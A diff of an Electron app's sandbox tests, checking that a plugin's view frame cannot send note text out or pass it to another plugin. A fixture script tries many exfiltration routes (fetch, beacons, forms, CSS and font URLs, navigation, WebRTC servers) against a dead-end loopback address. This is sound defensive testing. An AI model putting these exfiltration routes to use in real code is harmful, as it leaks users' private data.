@@ -1,11 +1,11 @@
 import { execFile } from 'node:child_process'
 import { randomBytes } from 'node:crypto'
 import { createSocket } from 'node:dgram'
-import { appendFile, readFile } from 'node:fs/promises'
-import { connect, createServer, type Server } from 'node:net'
+import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises'
+import { connect, createServer } from 'node:net'
 import path from 'node:path'
 import { promisify } from 'node:util'
-import type { ElectronApplication, Worker } from 'playwright'
+import type { ElectronApplication, Page, Worker } from 'playwright'
 import { afterEach, describe, expect, it } from 'vitest'
 import type { Capability } from '../../api/capabilities.ts'
 import { defaultSwitches, StateStore } from '../../backend/boot/state.ts'
@@ -15,18 +15,15 @@ import { filesFor, workerManifest, writeFolder, writeApproved } from '../plugins
 import { cleanup, counting, editorPage, launch, logged, temp, tick, until, workersPage } from './helpers.ts'
 
 const run = promisify(execFile)
-const listeners: Server[] = []
-afterEach(async () => {
-  for (const server of listeners.splice(0)) server.close()
-  await cleanup()
-})
+afterEach(cleanup)
 
 // HETU_PROBES=<file> appends what each case found, one JSON line each
 async function found(probe: string, result: unknown): Promise<void> {
   const file = process.env.HETU_PROBES
-  if (file !== undefined && file !== '') await appendFile(file, `${JSON.stringify({ probe, result })}
-`)
+  if (file !== undefined && file !== '') await appendFile(file, `${JSON.stringify({ probe, result })}\n`)
 }
+
+const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8cfc0f01f0005000201ab4f5e0b0000000049454e44ae426082', 'hex')
 
 const sdk = path.join(import.meta.dirname, '..', '..', 'sdk', 'index.ts').split(path.sep).join('/')
 
@@ -59,17 +56,23 @@ export default definePlugin({
 `
 const page = (script: string) => `<!doctype html><html><head><meta charset="utf-8"><script src="${script}"></script></head><body><p>frame</p></body></html>`
 
-// hetu with the columns layout and these plugins, each with one view drawn by its frame board.html among its files.
-// Answers once each plugin's frame has said hello
-async function started(plugins: Record<string, Record<string, string>>): Promise<{ app: ElectronApplication, dataDir: string, workers: Record<string, Worker> }> {
+// hetu with the columns layout and these plugins, each with one view drawn by its frame board.html among its files,
+// the notes folder holding notes and each plugin granted to read the paths reads names. Answers once each plugin's
+// frame has said hello
+async function started(plugins: Record<string, Record<string, string>>, setup: { notes?: Record<string, Buffer>, reads?: string[] } = {}): Promise<{ app: ElectronApplication, editor: Page, dataDir: string, workers: Record<string, Worker> }> {
   const dataDir = await temp()
   const store = new StateStore(dataDir)
   await store.writeSwitches({ ...defaultSwitches(), off: [] })
-  await store.writeLuoshu({ folder: await temp() })
+  const folder = await temp()
+  for (const [name, bytes] of Object.entries(setup.notes ?? {})) {
+    await mkdir(path.dirname(path.join(folder, name)), { recursive: true })
+    await writeFile(path.join(folder, name), bytes)
+  }
+  await store.writeLuoshu({ folder })
   const source = await temp()
   await writeFolder(source, { 'src/worker.ts': worker, 'src/columns.ts': columns })
   const [built] = await buildPlugin(source, { entries: { 'worker.js': 'src/worker.ts' }, workers: ['worker.js'], write: false })
-  const granted: Capability[] = [{ type: 'ui.view' }]
+  const granted: Capability[] = [{ type: 'ui.view' }, ...(setup.reads === undefined ? [] : [{ type: 'luoshu.read' as const, paths: setup.reads }])]
   for (const [id, files] of Object.entries(plugins)) {
     const manifest = workerManifest(id, {
       capabilities: granted,
@@ -99,7 +102,7 @@ async function started(plugins: Record<string, Record<string, string>>): Promise
     workers[id] = host.workers()[0] as Worker
     await until(async () => (await messages(workers[id]!)).length >= 1)
   }
-  return { app, dataDir, workers }
+  return { app, editor, dataDir, workers }
 }
 
 type Heard = { topic: string, instance?: string, data?: unknown }
@@ -118,30 +121,43 @@ async function ask(worker: Worker, data: unknown): Promise<Record<string, unknow
   return (await messages(worker))[before] as Record<string, unknown>
 }
 
-// A TCP listener on loopback standing in for the network, keeping the first line of each connection
-async function listener(): Promise<{ port: number, heard: string[] }> {
-  const heard: string[] = []
-  const server = createServer(socket => {
-    heard.push('connection')
-    socket.once('data', data => heard.push(data.toString('latin1').split('\r\n')[0]!))
-    socket.on('error', () => {})
-    setTimeout(() => socket.destroy(), 200)
-  })
-  listeners.push(server)
-  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
-  return { port: (server.address() as { port: number }).port, heard }
-}
-
-// The net log of everything Chromium did while the run went
+// The net log of everything Chromium did while the run went. Every session sends through a proxy that leads nowhere,
+// so a request that got out never reaches a listener the test owns and the log is where it shows. The control, last:
+// with the editor session's request filter taken off, main asks for a URL through that session and the log holds it,
+// so the log sees a request from the editor session behind that proxy. The filter stays off for the rest of the app's run
 async function netLogged(app: ElectronApplication, run: () => Promise<void>): Promise<string> {
   const log = path.join(await temp(), 'net.json')
+  const control = `http://127.0.0.1:9/control${randomBytes(6).toString('hex')}`
   await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
   await run()
+  const answer = await app.evaluate(({ session }, [name, url]) => {
+    const ses = session.fromPartition(name as string)
+    ses.webRequest.onBeforeRequest(null)
+    return ses.fetch(url as string).then(() => 'answered', (err: Error) => err.message)
+  }, [partition('editor'), control])
   await app.evaluate(({ netLog }) => netLog.stopLogging())
   const text = await readFile(log, 'utf8')
-  expect(text).toContain('"constants"')
+  expect(answer).not.toBe('answered')
+  expect(text).toContain(control)
   return text
 }
+
+// A note's image URL minted for the plugin as the editor page asks for one, not yet used
+const imageTicket = (editor: Page, plugin: string, at: string) => editor.evaluate(([owner, file]) => new Promise<string>((resolve, reject) => {
+  const bridge = (window as unknown as { hetu: { send(message: unknown): void, listen(listener: (message: unknown) => void): void } }).hetu
+  const id = 1_000_000
+  bridge.listen(message => {
+    const got = message as { kind?: string, id?: number, ok?: boolean, result?: { url: string } }
+    if (got.kind === 'reply' && got.id === id) {
+      if (got.ok === true) resolve(got.result!.url)
+      else reject(new Error(JSON.stringify(got)))
+    }
+  })
+  bridge.send({ v: 1, kind: 'call', id, action: 'editor.image', args: { plugin: owner, path: file } })
+}), [plugin, at])
+// What the editor session's protocol handler answers for a URL, asked from main as the page's own loads are
+const status = (app: ElectronApplication, url: string) =>
+  app.evaluate(async ({ session }, [name, at]) => (await session.fromPartition(name as string).fetch(at as string)).status, [partition('editor'), url])
 
 // The fixture plugin's frame: told where to by the test, tries every way out of its own files it has and reports what
 // each saw. An outcome is load, read, open, ran or registered only when something got through
@@ -177,11 +193,11 @@ function started(make) {
   })
 }
 function ways(to) {
-  var http = 'http://127.0.0.1:' + to.port + '/'
+  var http = 'http://127.0.0.1:9/' + to.label + '/'
   return {
     fetch: attempt(function (end) { fetch(http + 'fetch').then(function (r) { return r.text() }).then(function (t) { end('read ' + t) }, function (err) { end('rejected ' + err.name) }) }),
     xhr: attempt(function (end) { var x = new XMLHttpRequest(); x.open('GET', http + 'xhr'); x.onload = function () { end('read ' + x.responseText) }; x.onerror = function () { end('error') }; x.send() }),
-    websocket: attempt(function (end) { var w = new WebSocket('ws://127.0.0.1:' + to.port + '/ws'); w.onopen = function () { end('open') }; w.onerror = function () { end('error') } }),
+    websocket: attempt(function (end) { var w = new WebSocket('ws://127.0.0.1:9/' + to.label + '/ws'); w.onopen = function () { end('open') }; w.onerror = function () { end('error') } }),
     eventsource: attempt(function (end) { var s = new EventSource(http + 'es'); s.onopen = function () { end('open') }; s.onerror = function () { s.close(); end('error') } }),
     beacon: attempt(function (end) { end('returned ' + navigator.sendBeacon(http + 'beacon', 'note text')) }),
     form: attempt(function (end) { var f = add('form', { action: http + 'form', method: 'post' }, document.body); add('input', { name: 'note', value: 'note text' }, f); f.submit(); setTimeout(function () { end('quiet') }, 1000) }),
@@ -189,9 +205,9 @@ function ways(to) {
     top: attempt(function (end) { top.location.href = http + 'top'; end('assigned') }),
     prefetch: attempt(function (end) {
       add('link', { rel: 'prefetch', href: http + 'prefetch' }); add('link', { rel: 'preload', as: 'fetch', href: http + 'preload' })
-      add('link', { rel: 'preconnect', href: http }); add('link', { rel: 'dns-prefetch', href: '//' + to.label + '.example' })
       setTimeout(function () { end('quiet') }, 1500)
     }),
+    iframe: attempt(function (end) { add('iframe', { src: http + 'iframe' }, document.body); setTimeout(function () { end('quiet') }, 1500) }),
     css: loads('link', { rel: 'stylesheet', href: 'exfil.css' }).then(function (own) {
       document.body.style.backgroundImage = 'url(' + http + 'cssom)'
       return new FontFace('out', 'url(' + http + 'font)').load().then(function () { return 'sheet ' + own + ', font load' }, function () { return 'sheet ' + own + ', font error' })
@@ -210,16 +226,48 @@ function ways(to) {
     }),
   }
 }
-// Every way a frame could hand another plugin's frame a note: a broadcast and each store. Answers what was there to read
+// Each store a frame could hand another plugin's frame a note through: reads what is there and, given a note, writes it.
+// Answers what each read or how it failed
 function stores(note) {
-  function each(run) { try { return run() } catch (err) { return 'threw ' + err.name } }
-  return {
-    local: each(function () { var was = localStorage.getItem('hetu'); if (note) localStorage.setItem('hetu', note); return was }),
-    session: each(function () { var was = sessionStorage.getItem('hetu'); if (note) sessionStorage.setItem('hetu', note); return was }),
-    cookie: each(function () { var was = document.cookie; if (note) document.cookie = 'hetu=' + note; return was }),
-    indexedDB: each(function () { indexedDB.open('hetu'); return 'opened' }),
-    caches: each(function () { return typeof caches }),
+  function each(run) {
+    return new Promise(function (resolve) {
+      try { Promise.resolve(run()).then(resolve, function (err) { resolve('rejected ' + err.name) }) } catch (err) { resolve('threw ' + err.name) }
+    })
   }
+  function database() {
+    return new Promise(function (resolve, reject) {
+      var opening = indexedDB.open('hetu', 1)
+      opening.onupgradeneeded = function () { opening.result.createObjectStore('notes') }
+      opening.onerror = function () { reject(opening.error) }
+      opening.onsuccess = function () {
+        var done = opening.result.transaction('notes', 'readwrite')
+        var was = done.objectStore('notes').get('note')
+        if (note) done.objectStore('notes').put(note, 'note')
+        done.oncomplete = function () { resolve(was.result === undefined ? null : was.result) }
+        done.onerror = function () { reject(done.error) }
+      }
+    })
+  }
+  function cache() {
+    return caches.open('hetu').then(function (opened) {
+      return opened.match('/note').then(function (found) { return found ? found.text() : null }).then(function (was) {
+        return note ? opened.put('/note', new Response(note)).then(function () { return was }) : was
+      })
+    })
+  }
+  var runs = {
+    local: function () { var was = localStorage.getItem('hetu'); if (note) localStorage.setItem('hetu', note); return was },
+    session: function () { var was = sessionStorage.getItem('hetu'); if (note) sessionStorage.setItem('hetu', note); return was },
+    cookie: function () { var was = document.cookie; if (note) document.cookie = 'hetu=' + note; return was },
+    indexedDB: database,
+    caches: cache,
+  }
+  var names = Object.keys(runs)
+  return Promise.all(names.map(function (name) { return each(runs[name]) })).then(function (outcomes) {
+    var found = {}
+    names.forEach(function (name, i) { found[name] = outcomes[i] })
+    return found
+  })
 }
 var heard = []
 var channel = null
@@ -231,13 +279,18 @@ window.addEventListener('message', function (event) {
     if (data.ways) {
       var all = ways(data.ways)
       var names = Object.keys(all)
-      Promise.all(names.map(function (name) { return all[name] })).then(function (outcomes) {
+      var own = loads('link', { rel: 'stylesheet', href: 'own.css' })
+      Promise.all(names.map(function (name) { return all[name] }).concat([own])).then(function (outcomes) {
         var report = {}
         names.forEach(function (name, i) { report[name] = outcomes[i] })
-        port.postMessage(JSON.stringify({ outcomes: report }))
+        port.postMessage(JSON.stringify({ outcomes: report, own: outcomes[names.length] }))
       })
     }
-    if (data.go) location.href = 'http://127.0.0.1:' + data.go + '/navigate'
+    if (data.go) {
+      window.addEventListener('pagehide', function () { navigator.sendBeacon(data.go + 'unload', 'note text') })
+      if (data.refresh) add('meta', { 'http-equiv': 'refresh', content: '0;url=' + data.go + 'refresh' })
+      else location.href = data.go + 'navigate'
+    }
     if (data.listen) {
       channel = new BroadcastChannel('hetu')
       channel.onmessage = function (e) { heard.push(e.data) }
@@ -248,63 +301,84 @@ window.addEventListener('message', function (event) {
     if (data.send) {
       var sending = new BroadcastChannel('hetu')
       sending.postMessage(data.send)
-      port.postMessage(JSON.stringify({ sent: stores(data.send) }))
+      stores(data.send).then(function (sent) { port.postMessage(JSON.stringify({ sent: sent })) })
     }
-    if (data.read) port.postMessage(JSON.stringify({ heard: heard, stored: stores(null) }))
+    if (data.read) stores(null).then(function (stored) { port.postMessage(JSON.stringify({ heard: heard, stored: stored })) })
   }
   port.postMessage(JSON.stringify({ hello: location.host }))
 })
 `
-const exfilCss = (port: number) => `@import url("http://127.0.0.1:${port}/import.css");
-@font-face { font-family: out; src: url("http://127.0.0.1:${port}/face.woff2"); }
-body { background-image: url("http://127.0.0.1:${port}/css-url.png"); font-family: out; }
+const exfilCss = (label: string) => `@import url("http://127.0.0.1:9/${label}/import.css");
+@font-face { font-family: out; src: url("http://127.0.0.1:9/${label}/face.woff2"); }
+body { background-image: url("http://127.0.0.1:9/${label}/css-url.png"); font-family: out; }
 `
-const exfilFiles = (port: number) => ({ 'board.html': page('exfil.js'), 'exfil.js': exfil, 'exfil.css': exfilCss(port), 'w.js': 'postMessage(1)' })
-// What got through: an outcome that loaded, read, opened, ran or registered
-const through = (outcomes: Record<string, string>) => Object.entries(outcomes).filter(([, outcome]) => /^(load|read|open|ran|registered)|load$/.test(outcome))
+const exfilFiles = (label: string) => ({ 'board.html': page('exfil.js'), 'exfil.js': exfil, 'exfil.css': exfilCss(label), 'own.css': 'p { color: rgb(1, 2, 3) }', 'w.js': 'postMessage(1)' })
+// What got through: an outcome that loaded, read, opened, ran, registered or moved the top page
+const through = (outcomes: Record<string, string>) => Object.entries(outcomes).filter(([, outcome]) => /^(load|read|open|ran|registered|assigned)|load$/.test(outcome))
+const label = () => `hetu${randomBytes(6).toString('hex')}`
 
 describe('a view frame on its plugin\'s host', () => {
+  // The frame's sandbox, with no allow-forms, allow-popups or allow-top-navigation, stops a form, a popup and top
+  // navigation before the CSP's form-action, the window open handler or will-navigate are asked
   it('reaches nothing outside its plugin\'s files by any request, page, worker or load from hetu\'s other hosts', async () => {
-    const out = await listener()
-    const label = `hetu${randomBytes(6).toString('hex')}`
-    const { app, workers } = await started({ kanban: exfilFiles(out.port), other: { 'board.html': page('other.js'), 'other.js': exfil } })
+    const marked = label()
+    const { app, editor, workers } = await started(
+      { kanban: exfilFiles(marked), other: { 'board.html': page('other.js'), 'other.js': exfil } },
+      { notes: { 'pics/dot.png': PNG }, reads: ['pics/**'] },
+    )
     const frames = await app.evaluate(({ webContents }) => webContents.getAllWebContents().flatMap(contents => contents.mainFrame.framesInSubtree.map(frame => frame.url)))
     const otherBoard = frames.find(url => url.startsWith('hetu://other.views/'))!
-    const ticket = randomBytes(16).toString('hex')
     let report: Record<string, unknown> = {}
+    let unused = 0
     const text = await netLogged(app, async () => {
-      report = await ask(workers.kanban!, { ways: { port: out.port, label, ticket, other: 'other', otherScript: otherBoard.replace(/board\.html$/, 'other.js') } })
+      const ticket = await imageTicket(editor, 'kanban', 'pics/dot.png')
+      report = await ask(workers.kanban!, { ways: { label: marked, ticket: ticket.slice('hetu://images/'.length), other: 'other', otherScript: otherBoard.replace(/board\.html$/, 'other.js') } })
+      // The frame's image took nothing from the images host: the URL it was handed still loads, once
+      unused = await status(app, ticket)
+      await tick(1000)
+      // The editor page is still where it was and the frame still answers
+      expect(await app.evaluate(({ webContents }) => webContents.getAllWebContents().some(contents => contents.getURL() === 'hetu://editor/'))).toBe(true)
+      expect(await ask(workers.kanban!, { read: true })).toHaveProperty('stored')
     })
     const outcomes = report.outcomes as Record<string, string>
-    await found('ways out', outcomes)
-    expect(Object.keys(outcomes)).toHaveLength(19)
+    await found('ways out', report)
+    expect(Object.keys(outcomes)).toHaveLength(20)
     expect(through(outcomes)).toEqual([])
+    // A stylesheet of the frame's own loads, so the loads it is refused are refused for where they come from. Its
+    // exfil.css fails to load as a whole, since a stylesheet whose @import fails fires error
+    expect(report.own).toBe('load')
     expect(outcomes.fetch).toBe('rejected TypeError')
-    expect(out.heard).toEqual([])
-    expect(text).not.toContain(`127.0.0.1:${out.port}`)
-    expect(text).not.toContain(label)
-    // The editor page is still where it was and the frame still answers
-    expect(await app.evaluate(({ webContents }) => webContents.getAllWebContents().some(contents => contents.getURL() === 'hetu://editor/'))).toBe(true)
-    expect(await ask(workers.kanban!, { read: true })).toHaveProperty('stored')
+    expect(outcomes.imagesHost).toBe('error')
+    expect(unused).toBe(200)
+    expect(text).not.toContain(marked)
   })
 
   it('reaches nothing when it navigates itself to the network, and is removed', async () => {
-    const out = await listener()
-    const { workers, dataDir } = await started({ kanban: exfilFiles(out.port) })
-    await post(workers.kanban!, { go: out.port })
-    await until(() => logged(dataDir, 'frame.navigated', { plugin: 'kanban' }))
-    await tick(500)
-    expect(out.heard).toEqual([])
+    const marked = label()
+    const { app, workers, dataDir } = await started({ kanban: exfilFiles(marked), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
+    const go = `http://127.0.0.1:9/${marked}/`
+    const text = await netLogged(app, async () => {
+      // Each page sends a beacon as it goes, one by a link followed and one by a meta refresh
+      await post(workers.kanban!, { go })
+      await post(workers.other!, { go, refresh: true })
+      for (const plugin of ['kanban', 'other']) await until(() => logged(dataDir, 'frame.navigated', { plugin }))
+      await tick(1500)
+    })
+    expect(text).not.toContain(marked)
   })
 
   it('hands another plugin\'s frame nothing by a broadcast or a store', async () => {
-    const { workers } = await started({ kanban: exfilFiles(1), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
+    const { workers } = await started({ kanban: exfilFiles(label()), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
     expect(await ask(workers.other!, { listen: true })).toEqual({ listening: true })
     const note = `note${randomBytes(6).toString('hex')}`
-    await ask(workers.kanban!, { send: note })
+    const { sent } = await ask(workers.kanban!, { send: note }) as { sent: Record<string, unknown> }
     await tick(500)
     const read = await ask(workers.other!, { read: true }) as { heard: string[], stored: Record<string, unknown> }
-    await found('between plugins', read)
+    await found('between plugins', { sent, read })
+    // Every store refuses the sender itself, so a store open to a frame shows here before any other frame reads it.
+    // indexedDB refuses inside the promise that opens it
+    const refused = 'threw SecurityError'
+    expect(sent).toEqual({ local: refused, session: refused, cookie: refused, indexedDB: 'rejected SecurityError', caches: refused })
     // The frame hears its own channel, so a broadcast from the other plugin would have been heard
     expect(read.heard).toEqual(['own'])
     expect(JSON.stringify(read.stored)).not.toContain(note)
@@ -432,34 +506,21 @@ describe('WebRTC from a view frame', () => {
     for (const answer of answers) expect(answer).toMatch(/ERR_NAME_NOT_RESOLVED/)
   })
 
-  it('looks up no name a frame gives as a TURN or STUN server or an mDNS candidate, by the net log and a listener on loopback', async () => {
+  // A remote mDNS candidate is the packets test's, since its query goes out on the real interfaces under a mapped name
+  it('looks up no name a frame gives as a TURN or STUN server, by the net log', async () => {
     const label = `hetu${randomBytes(6).toString('hex')}`
-    const mdns = createSocket({ type: 'udp4', reuseAddr: true })
-    let queries = 0
-    mdns.on('message', message => {
-      if (message.includes(label)) queries++
-    })
-    // macOS's mDNSResponder holds the wildcard address on 5353 and Node's reuseAddr sets only SO_REUSEPORT there, which
-    // shares the same address and not a narrower one beside it, so the listener takes the wildcard on macOS
-    await new Promise<void>(resolve => mdns.bind(5353, process.platform === 'darwin' ? '0.0.0.0' : '127.0.0.1', resolve))
-    mdns.addMembership('224.0.0.251', '127.0.0.1')
-    try {
-      const { app, workers: { kanban: worker } } = await started(rtcFiles)
-      const log = path.join(await temp(), 'net.json')
-      await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
-      const report = await rtcReport(worker, [
-        { urls: `turn:${label}t.hetu-probe.invalid:3478?transport=tcp`, username: 'note text', credential: 'x' },
-        { urls: `stun:${label}s.hetu-probe.invalid:3478` },
-      ], `${label}m`)
-      expect(report).toEqual({ tried: [expect.any(String), expect.any(String), expect.any(String)] })
-      await app.evaluate(({ netLog }) => netLog.stopLogging())
-      const text = await readFile(log, 'utf8')
-      expect(text).toContain('"constants"')
-      const seen = { turn: text.includes(`${label}t`), stun: text.includes(`${label}s`), mdns: text.includes(`${label}m`), multicast: queries }
-      expect(seen).toEqual({ turn: false, stun: false, mdns: false, multicast: 0 })
-    } finally {
-      mdns.close()
-    }
+    const { app, workers: { kanban: worker } } = await started(rtcFiles)
+    const log = path.join(await temp(), 'net.json')
+    await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
+    const report = await rtcReport(worker, [
+      { urls: `turn:${label}t.hetu-probe.invalid:3478?transport=tcp`, username: 'note text', credential: 'x' },
+      { urls: `stun:${label}s.hetu-probe.invalid:3478` },
+    ])
+    expect(report).toEqual({ tried: [expect.any(String), expect.any(String)] })
+    await app.evaluate(({ netLog }) => netLog.stopLogging())
+    const text = await readFile(log, 'utf8')
+    expect(text).toContain('"constants"')
+    expect({ turn: text.includes(`${label}t`), stun: text.includes(`${label}s`) }).toEqual({ turn: false, stun: false })
   })
 })
 
@@ -489,41 +550,63 @@ async function openSockets(pids: number[]): Promise<string[]> {
   return [...found].filter(entry => !local.test(entry.split(' ')[1]!))
 }
 
+const onWindows = process.platform === 'win32'
+
+// Each expected failure below holds only its last expect. What it stands on runs as a plain test before it, so a
+// start, a report or a capture going wrong fails the run instead of passing as the expected failure
 describe('the sockets of a frame\'s WebRTC', () => {
-  // TODO: a frame's RTCPeerConnection makes Chromium's network service bind UDP 5353 on 0.0.0.0 and :: for its mDNS
-  // responder and a UDP pair on 0.0.0.0 and :: for each connection's gathering, under disable_non_proxied_udp, which
-  // raises the firewall's prompt. Drop fails once hetu stops them and run it on macOS once checked there
-  it.runIf(process.platform === 'win32').fails('leaves no hetu process holding a socket on an address other than loopback while a frame offers', async () => {
+  let open: string[] | undefined
+  it.runIf(onWindows)('finds no hetu process holding a socket off loopback before a frame offers, then the frame offering', async () => {
     const stun = createSocket('udp4')
     await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve))
     try {
       const { app, workers: { kanban: worker } } = await started(rtcFiles)
       const pids = await app.evaluate(({ app: electronApp }) => electronApp.getAppMetrics().map(metric => metric.pid))
       expect(pids.length).toBeGreaterThanOrEqual(4)
-      const [open, report] = await Promise.all([openSockets(pids), rtcReport(worker!, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])])
-      await found('open sockets', open)
+      // The baseline: the frame loaded and no peer connection made yet
+      expect(await openSockets(pids)).toEqual([])
+      const [seen, report] = await Promise.all([openSockets(pids), rtcReport(worker!, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])])
       expect(report).toEqual({ tried: [expect.any(String)] })
-      expect(open).toEqual([])
+      await found('open sockets', seen)
+      open = seen
     } finally {
       stun.close()
     }
   })
+  // TODO: a frame's RTCPeerConnection makes Chromium's network service bind UDP 5353 on 0.0.0.0 and :: for its mDNS
+  // responder and a UDP pair on 0.0.0.0 and :: for each connection's gathering, under disable_non_proxied_udp, which
+  // raises the firewall's prompt. Drop fails once hetu stops them and run it on macOS once checked there
+  it.runIf(onWindows).fails('leaves no hetu process holding a socket on an address other than loopback while a frame offers', () => {
+    expect(open).toEqual([])
+  })
 })
 
+// The addresses other than loopback the network service sent UDP to while the frame tried what it was sent, by the net log
+async function sentOffLoopback(app: ElectronApplication, worker: Worker, servers: object[], mdns?: string): Promise<string[]> {
+  const log = path.join(await temp(), 'net.json')
+  await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
+  const report = await rtcReport(worker, servers, mdns)
+  await app.evaluate(({ netLog }) => netLog.stopLogging())
+  expect(report).toEqual({ tried: [expect.any(String)] })
+  const { constants, events } = JSON.parse(await readFile(log, 'utf8')) as { constants: { logEventTypes: Record<string, number> }, events: { type: number, params?: { address?: string } }[] }
+  expect(constants.logEventTypes.UDP_BYTES_SENT).toEqual(expect.any(Number))
+  const sent = events.filter(event => event.type === constants.logEventTypes.UDP_BYTES_SENT).map(event => event.params?.address ?? '')
+  return sent.filter(address => !/^(127\.|\[::1\])/.test(address))
+}
+
 describe('the packets of a frame\'s WebRTC', () => {
+  let sent: string[] | undefined
+  it.runIf(onWindows)('sends nothing off loopback while a frame offers a peer connection, then the frame handing a remote mDNS candidate', async () => {
+    const { app, workers: { kanban: worker } } = await started(rtcFiles)
+    // The control: a peer connection offering to a STUN server on loopback, under the policy, sends nothing anywhere
+    expect(await sentOffLoopback(app, worker!, [{ urls: 'stun:127.0.0.1:9' }])).toEqual([])
+    sent = await sentOffLoopback(app, worker!, [], `hetu${randomBytes(6).toString('hex')}`)
+    await found('packets sent', sent)
+  })
   // TODO: a remote candidate on <name>.local makes Chromium's network service send an mDNS query for ~NOTFOUND, the name
   // host-resolver-rules maps it to, to 224.0.0.251 and ff02::fb on every interface. The name stays home but the packet
   // leaves when the frame says. Drop fails once hetu stops it and run it on macOS once checked there
-  it.runIf(process.platform === 'win32').fails('sends no packet to an address other than loopback when a frame hands a remote mDNS candidate, by the net log', async () => {
-    const { app, workers: { kanban: worker } } = await started(rtcFiles)
-    const log = path.join(await temp(), 'net.json')
-    await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
-    const report = await rtcReport(worker!, [], `hetu${randomBytes(6).toString('hex')}`)
-    await app.evaluate(({ netLog }) => netLog.stopLogging())
-    expect(report).toEqual({ tried: [expect.any(String)] })
-    const { constants, events } = JSON.parse(await readFile(log, 'utf8')) as { constants: { logEventTypes: Record<string, number> }, events: { type: number, params?: { address?: string } }[] }
-    const sent = events.filter(event => event.type === constants.logEventTypes.UDP_BYTES_SENT).map(event => event.params?.address ?? '')
-    await found('packets sent', sent)
-    expect(sent.filter(address => !/^(127\.|\[::1\])/.test(address))).toEqual([])
+  it.runIf(onWindows).fails('sends no packet to an address other than loopback when a frame hands a remote mDNS candidate, by the net log', () => {
+    expect(sent).toEqual([])
   })
 })
